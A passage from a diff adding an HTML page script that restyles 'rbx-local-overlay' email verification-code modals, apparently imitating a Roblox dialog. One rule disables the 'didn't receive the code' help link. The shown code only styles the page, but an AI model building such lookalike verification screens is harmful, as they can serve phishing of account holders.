+      .rbx-local-overlay .modal-header {
+        position: relative !important;
+        padding-left: ${HEADER_LEFT_PADDING_PX}px !important; /* espace pour la croix */
+        display: block !important; /* block pour faciliter le centrage */
+        text-align: center !important;
+      }
+
+      /* titre centré */
+      .rbx-local-overlay .modal-header .modal-title {
+        display: block !important;
+        width: 100% !important;
+        margin: 0 !important;
+        text-align: center !important;
+        font-weight: 600 !important;
+      }
+
+      /* croix toujours en haut à gauche (absolute) */
+      .rbx-local-overlay .modal-header .close {
+        position: absolute !important;
+        left: 12px !important;
+        top: 10px !important;
+        right: auto !important;
+        transform: none !important;
+        z-index: 1001 !important;
+        background: transparent !important;
+        border: 0 !important;
+        padding: 4px 6px !important;
+        cursor: pointer !important;
+      }
+
+      /* ajustement du body/padding pour petits écrans */
+      .rbx-local-overlay .modal-body { padding: 12px !important; box-sizing: border-box; }
+
+      /* empêcher le lien "Tu n'as pas reçu..." d'être cliquable (déjà géré par JS) */
+      .rbx-local-overlay .email-verify-code-help-link a {
+        pointer-events: none !important;
+        cursor: default !important;
+        text-decoration: none !important;
+        color: inherit !important;
+      }
+    `;
+    if(!style){
+      style = document.createElement('style');
+      style.id = id;
+      style.appendChild(document.createTextNode(css));
+      (document.head || document.documentElement).appendChild(style);
+    } else {
+      // update existing
+      style.textContent = css;
+    }
+  }
+
+  // applique aussi des corrections inline si modal est déjà injecté
+  function applyInlineToOverlay(overlay){
+    if(!overlay || !(overlay instanceof Element)) return;
+    try{
+      const dlg = overlay.querySelector('.modal-lg.modal-dialog');
+      const content = overlay.querySelector('.modal-content');
+      const header = overlay.querySelector('.modal-header');
+      const title = overlay.querySelector('.modal-title');
+      const closeBtn = overlay.querySelector('.modal-header .close');
+
+      if(dlg){
+        dlg.style.maxWidth = TARGET_MAX_WIDTH_PX + 'px';
+        dlg.style.width = '90%';
+      }
+      if(content){
+        content.style.borderRadius = BORDER_RADIUS_PX + 'px';
+        content.style.position = 'relative';
+      }
+      if(header){
+        header.style.paddingLeft = HEADER_LEFT_PADDING_PX + 'px';
+        header.style.textAlign = 'center';
+        header.style.display = 'block';
+      }
+      if(title){
+        title.style.display = 'block';
+        title.style.width = '100%';
+        title.style.textAlign = 'center';
+        title.style.margin = '0';
+      }
+      if(closeBtn && !closeBtn.__rbx_close_wired_v2){
+        closeBtn.style.position = 'absolute';
+        closeBtn.style.left = '12px';
+        closeBtn.style.top = '10px';
+        closeBtn.style.right = 'auto';
+        closeBtn.style.transform = 'none';
+        closeBtn.__rbx_close_wired_v2 = true;
+        closeBtn.addEventListener('click', function(){ const ov = overlay.closest && overlay.closest('.rbx-local-overlay'); if(ov) ov.remove(); });
+      }
+    }catch(e){ console.warn('applyInlineToOverlay error', e); }
+  }
+
+  // observe les overlays modales et applique les styles
+  function observeAndPatch(){
+    // patch existing
+    document.querySelectorAll('.rbx-local-overlay').forEach(applyInlineToOverlay);
+
+    const mo = new MutationObserver(mutations=>{
+      for(const mut of mutations){
+        for(const n of mut.addedNodes){
+          if(!(n instanceof Element)) continue;
+          if(n.classList && n.classList.contains('rbx-local-overlay')){
+            applyInlineToOverlay(n);
+          } else {
+            const overlays = n.querySelectorAll && n.querySelectorAll('.rbx-local-overlay');
+            if(overlays && overlays.length){
+              overlays.forEach(applyInlineToOverlay);
+            }
+            const dlg = n.querySelectorAll && n.querySelectorAll('.modal-lg.modal-dialog');
+            if(dlg && dlg.length){
+              // try to find overlay parent
+              const parentOv = n.closest && n.closest('.rbx-local-overlay');
+              if(parentOv) applyInlineToOverlay(parentOv);
+              else n.querySelectorAll('.modal-lg.modal-dialog').forEach(d=>{
+                const ov = d.closest('.rbx-local-overlay') || d.parentNode;
+                if(ov) applyInlineToOverlay(ov);
+              });
+            }
+          }
+        }
+      }
+    });
+    mo.observe(document.documentElement || document.body, { childList:true, subtree:true });
+  }
+
+  // init
+  document.addEventListener('DOMContentLoaded', function(){
+    injectOrUpdateStyles();
+    observeAndPatch();
+  });
+
+})();
+</script>
+
+</body>
+</html>
+ 
